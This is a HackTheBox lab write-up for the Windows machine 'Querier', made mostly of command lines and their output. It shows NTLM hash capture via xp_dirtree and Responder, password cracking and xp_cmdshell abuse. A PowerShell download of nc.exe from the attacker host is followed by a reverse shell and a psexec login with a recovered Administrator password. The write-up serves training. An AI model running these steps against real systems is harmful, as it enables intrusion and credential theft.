---
layout: post
title: Hackthebox Querier Writeup
categories: HackTheBox
---

![placeholder](https://inar1.github.io/public/images/2019-06-24/querier-badge.png)
## Explanation
<a href="https://www.hackthebox.eu">Hackthebox</a> is a website which has bunch of vulnerable machines in its own VPN.<br>
This is a write-up of machine "Querier" on that website.<br>

## Solution
### 1. Initial Enumeration
TCP Port Scanning:
{% highlight shell %}
root@kali:~# nmap -p- 10.10.10.125 -sV -sC
Starting Nmap 7.70 ( https://nmap.org ) at 2019-06-22 11:04 EEST
Nmap scan report for 10.10.10.125
Host is up (0.039s latency).
Not shown: 65521 closed ports
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
1433/tcp  open  ms-sql-s      Microsoft SQL Server  14.00.1000.00
| ms-sql-ntlm-info: 
|   Target_Name: HTB
|   NetBIOS_Domain_Name: HTB
|   NetBIOS_Computer_Name: QUERIER
|   DNS_Domain_Name: HTB.LOCAL
|   DNS_Computer_Name: QUERIER.HTB.LOCAL
|   DNS_Tree_Name: HTB.LOCAL
|_  Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2019-06-18T12:52:51
|_Not valid after:  2049-06-18T12:52:51
|_ssl-date: 2019-06-22T07:06:20+00:00; -1h00m10s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -1h00m10s, deviation: 0s, median: -1h00m10s
| ms-sql-info: 
|   10.10.10.125:1433: 
|     Version: 
|       name: Microsoft SQL Server 
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 
|_    TCP port: 1433
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2019-06-22 10:06:21
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 100.11 seconds
{% endhighlight %}

SMB enumeration:
{% highlight shell %}
root@kali:~# smbclient -L //10.10.10.125/
Enter WORKGROUP\root's password: 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	Reports         Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.125 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Failed to connect with SMB1 -- no workgroup available
{% endhighlight %}

### 2. Getting User
In the SMB share //10.10.10.125/Reports, we can find an interesting .xlsm file.
{% highlight shell %}
root@kali:~# smbclient //10.10.10.125/Reports
Enter WORKGROUP\root's password: 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Tue Jan 29 01:23:48 2019
  ..                                  D        0  Tue Jan 29 01:23:48 2019
  Currency Volume Report.xlsm         A    12229  Mon Jan 28 00:21:34 2019

		6469119 blocks of size 4096. 1508496 blocks available
smb: \> 
{% endhighlight %}

It's a empty looks Microsoft excel file.<br>
However, it's just a zip archive and we can unzip like following.
{% highlight shell %}
root@kali:~# unzip 'Currency Volume Report.xlsm' 
Archive:  Currency Volume Report.xlsm
  inflating: [Content_Types].xml     
  inflating: _rels/.rels             
  inflating: xl/workbook.xml         
  inflating: xl/_rels/workbook.xml.rels  
  inflating: xl/worksheets/sheet1.xml  
  inflating: xl/theme/theme1.xml     
  inflating: xl/styles.xml           
  inflating: xl/vbaProject.bin       
  inflating: docProps/core.xml       
  inflating: docProps/app.xml 
{% endhighlight %}

Then, we can check if there is anything interesting with strings command.
{% highlight shell %}
root@kali:~# strings xl/*
strings: Warning: 'xl/_rels' is a directory
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<styleSheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006" mc:Ignorable="x14ac x16r2 xr" xmlns:x14ac="http://schemas.microsoft.com/office/spreadsheetml/2009/9/ac" xmlns:x16r2="http://schemas.microsoft.com/office/spreadsheetml/2015/02/main" xmlns:xr="http://schemas.microsoft.com/office/spreadsheetml/2014/revision"><fonts count="1" x14ac:knownFonts="1"><font><sz val="11"/><color theme="1"/><name val="Calibri"/><family val="2"/><scheme val="minor"/></font></fonts><fills count="2"><fill><patternFill patternType="none"/></fill><fill><patternFill patternType="gray125"/></fill></fills><borders count="1"><border><left/><right/><top/><bottom/><diagonal/></border></borders><cellStyleXfs count="1"><xf numFmtId="0" fontId="0" fillId="0" borderId="0"/></cellStyleXfs><cellXfs count="1"><xf numFmtId="0" fontId="0" fillId="0" borderId="0" xfId="0"/></cellXfs><cellStyles count="1"><cellStyle name="Normal" xfId="0" builtinId="0"/></cellStyles><dxfs count="0"/><tableStyles count="0" defaultTableStyle="TableStyleMedium2" defaultPivotStyle="PivotStyleLight16"/><extLst><ext uri="{EB79DEF2-80B8-43e5-95BD-54CBDDF9020C}" xmlns:x14="http://schemas.microsoft.com/office/spreadsheetml/2009/9/main"><x14:slicerStyles defaultSlicerStyle="SlicerStyleLight1"/></ext><ext uri="{9260A510-F301-46a8-8635-F512D64BE5F5}" xmlns:x15="http://schemas.microsoft.com/office/spreadsheetml/2010/11/main"><x15:timelineStyles defaultTimelineStyle="TimeSlicerStyleLight1"/></ext></extLst></styleSheet>
strings: Warning: 'xl/theme' is a directory
 macro to pull data for client volume reports
n.Conn]
Open 
rver=<
SELECT * FROM volume;
word>
 MsgBox "connection successful"
Set rs = conn.Execute("SELECT * @@version;")
Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6

...

{% endhighlight %}

On the last line of previous command, we can find a possible credential for SQL server.<br>
Then, try to connect to MSSQL with above password.<br>
Kali has the impacket installation by default and we can take advantage of script "mssqlclient.py".
{% highlight shell %}
root@kali:/usr/share/doc/python-impacket/examples# ./mssqlclient.py -windows-auth reporting@10.10.10.125
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

Password:  # PcwTWTHRwryjc$c6  
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: volume
[*] ENVCHANGE(LANGUAGE): Old Value: None, New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(QUERIER): Line 1: Changed database context to 'volume'.
[*] INFO(QUERIER): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands
SQL> 
{% endhighlight %}

Try to execute <a href="https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-2017">xp_cmdshell</a> stored procedure.<br>
However, user "reporting" doesn't have a permission for that.
{% highlight shell %}
SQL> xp_cmdshell cmd.exe
[-] ERROR(QUERIER): Line 1: The EXECUTE permission was denied on the object 'xp_cmdshell', database 'mssqlsystemresource', schema 'sys'.
{% endhighlight %}

Next, try to steal the NTLMv2 hash.<br>
Since Windows uses single-sign-on, by intercepting the traffic, we can achieve the hash.<br>
Run the responder and execute following command on MSSQL.
{% highlight shell %}
SQL> exec xp_dirtree '\\10.10.14.2\files'
subdirectory                                                                                                                                                                                                                                                            depth   
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   -----------  
{% endhighlight %}

Then, we can receive following NTLMv2 hash.
{% highlight shell %}
root@kali:~# responder -I tun0 -wrfv
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 2.3.3.9

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CRTL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    DNS/MDNS                   [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [ON]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Fingerprint hosts          [ON]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.2]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']



[+] Listening for events...
[SMBv2] NTLMv2-SSP Client   : 10.10.10.125
[SMBv2] NTLMv2-SSP Username : QUERIER\mssql-svc
[SMBv2] NTLMv2-SSP Hash     : mssql-svc::QUERIER:deb00bb106fe5da1:EB8A91F8C63C227442BC2AF1EB17959B:0101000000000000C0653150DE09D2012A46EC56A8D46106000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D201060004000200000008003000300000000000000000000000003000003D3A30F75BF9F458BD19D50ED26B7496E8FCB92F534405B48E047D4E2B7ADDB50A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E003200000000000000000000000000
[SMBv2] NTLMv2-SSP Client   : 10.10.10.125
[SMBv2] NTLMv2-SSP Username : QUERIER\mssql-svc
[SMBv2] NTLMv2-SSP Hash     : mssql-svc::QUERIER:19dda42e4d064351:5F4756B9EAD915C12102FDB6A3725118:0101000000000000C0653150DE09D20124480B4BE0560D5F000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D201060004000200000008003000300000000000000000000000003000003D3A30F75BF9F458BD19D50ED26B7496E8FCB92F534405B48E047D4E2B7ADDB50A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E003200000000000000000000000000
[SMBv2] NTLMv2-SSP Client   : 10.10.10.125
[SMBv2] NTLMv2-SSP Username : \gX
[SMBv2] NTLMv2-SSP Hash     : gX:::95b69835a01d6daf::
[SMBv2] NTLMv2-SSP Client   : 10.10.10.125
[SMBv2] NTLMv2-SSP Username : \gX
[SMBv2] NTLMv2-SSP Hash     : gX:::becdc277e39afb84::
{% endhighlight %}

Now, we got a hash for user mssql-svc.<br>
Then try to crack with John the Ripper.
{% highlight shell %}
root@kali:~# cat hash.txt 
mssql-svc::QUERIER:19dda42e4d064351:5F4756B9EAD915C12102FDB6A3725118:0101000000000000C0653150DE09D20124480B4BE0560D5F000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D201060004000200000008003000300000000000000000000000003000003D3A30F75BF9F458BD19D50ED26B7496E8FCB92F534405B48E047D4E2B7ADDB50A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E003200000000000000000000000000

root@kali:~# john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
corporate568     (mssql-svc)
1g 0:00:00:08 DONE (2019-06-23 18:29) 0.1149g/s 1030Kp/s 1030Kc/s 1030KC/s correforenz..coreyny11
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed
{% endhighlight %}

This means that we got following credential.
{% highlight shell %}
mssql-svc:corporate568
{% endhighlight %}

Since we got a credential for mssql, try to login again with the cred.
{% highlight shell %}
root@kali:~# /usr/share/doc/python-impacket/examples/mssqlclient.py -windows-auth mssql-svc@10.10.10.125
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

Password:  # corporate568
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: None, New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(QUERIER): Line 1: Changed database context to 'master'.
[*] INFO(QUERIER): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands
SQL>
{% endhighlight %}

This time, we have to enable the stored procedure "xp_cmdshell".
{% highlight shell %}
SQL> enable_xp_cmdshell
[*] INFO(QUERIER): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
[*] INFO(QUERIER): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL>
{% endhighlight %}

Then, we somehow need to get a reverse shell.<br>
Try to upload nc.exe which is installed Kali by default in the following directory.
{% highlight shell %}
root@kali:/usr/share/windows-resources/binaries# python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
{% endhighlight %}

Execute xp_cmdshell and download the nc.exe from our localhost.
{% highlight shell %}
SQL> xp_cmdshell "powershell Invoke-WebRequest -Uri 10.10.14.2/nc.exe -OutFile C:\\Users\\mssql-svc\\downloads\\nc.exe"
output                                                                             
--------------------------------------------------------------------------------   
NULL         
{% endhighlight %}

Next, launch the netcat on port 443 and execute the nc.exe uploaded.<br>
We can get a reverse shell.
{% highlight shell %}
SQL> xp_cmdshell "C:\\Users\mssql-svc\downloads\nc.exe -e cmd 10.10.14.2 443"
{% endhighlight %}
{% highlight shell %}
root@kali:~# nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.10.125] 49715
Microsoft Windows [Version 10.0.17763.292]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
querier\mssql-svc
{% endhighlight %}

User.txt is in the hoge directory of user mssql-svc.
{% highlgight shell %}
C:\Users\mssql-svc\Desktop>type user.txt
type user.txt
c37b41bb669da345bb14de50faab3c16
{% endhighlight %}

### 3. Getting Root
We can take advantage of <a href="https://github.com/PowerShellMafia/PowerSploit">PowerSploit</a>.<br><br>

At first, upload the script.
{% highlight shell %}
C:\Users\mssql-svc\Desktop>powershell Invoke-WebRequest -Uri 10.10.14.2/Privesc/PowerUp.ps1 -Outfile PowerUp.ps1
powershell Invoke-WebRequest -Uri 10.10.14.2/Privesc/PowerUp.ps1 -Outfile PowerUp.ps1
{% endhighlight %}

After the uploading, we can execute following commands to import the powershell script.
{% highlgight shell %}
C:\Users\mssql-svc\Desktop>powershell.exe -nop -exec bypass
powershell.exe -nop -exec bypass
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\mssql-svc\Desktop> import-module ./powerup.ps1
import-module ./powerup.ps1
{% endhighlight %}

Then, execute "Invoke-AllChecks".
{% highlight shell %}
PS C:\Users\mssql-svc\Desktop> invoke-allchecks
invoke-allchecks

[*] Running Invoke-AllChecks


[*] Checking if user is in a local group with administrative privileges...


[*] Checking for unquoted service paths...


[*] Checking service executable and argument permissions...


[*] Checking service permissions...


ServiceName   : UsoSvc
Path          : C:\Windows\system32\svchost.exe -k netsvcs -p
StartName     : LocalSystem
AbuseFunction : Invoke-ServiceAbuse -Name 'UsoSvc'
CanRestart    : True





[*] Checking %PATH% for potentially hijackable DLL locations...


ModifiablePath    : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps
IdentityReference : QUERIER\mssql-svc
Permissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
%PATH%            : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps
AbuseFunction     : Write-HijackDll -DllPath 'C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll'





[*] Checking for AlwaysInstallElevated registry key...


[*] Checking for Autologon credentials in registry...


[*] Checking for modifidable registry autoruns and configs...


[*] Checking for modifiable schtask files/configs...


[*] Checking for unattended install files...


UnattendPath : C:\Windows\Panther\Unattend.xml





[*] Checking for encrypted web.config strings...


[*] Checking for encrypted application pool and virtual directory passwords...


[*] Checking for plaintext passwords in McAfee SiteList.xml files....




[*] Checking for cached Group Policy Preferences .xml files....


Changed   : {2019-01-28 23:12:48}
UserNames : {Administrator}
NewName   : [BLANK]
Passwords : {MyUnclesAreMarioAndLuigi!!1!}
File      : C:\ProgramData\Microsoft\Group 
            Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\Groups.xml
{% endhighlight %}

We found that there is a Groups.xml left which has Administrator credential.
{% highlight shell %}
Administrator:MyUnclesAreMarioAndLuigi!!1!
{% endhighlight %}

As we talked, Kali has impacket installed by default.<br>
We can use the script "psexec.py" and get an administrator shell.
{% highlight shell %}
root@kali:/usr/share/doc/python-impacket/examples# ./psexec.py QUERIER/Administrator:'MyUnclesAreMarioAndLuigi!!1!'@10.10.10.125
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

[*] Requesting shares on 10.10.10.125.....
[*] Found writable share ADMIN$
[*] Uploading file JEUWVaHv.exe
[*] Opening SVCManager on 10.10.10.125.....
[*] Creating service qkdV on 10.10.10.125.....
[*] Starting service qkdV.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.292]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system
{% endhighlight %}

root.txt is in a home directory of Administrator.
{% highlight shell %}
C:\Users\Administrator\Desktop>type root.txt
b19c3794f786a1fdcf205f81497c3592
{% endhighlight %}
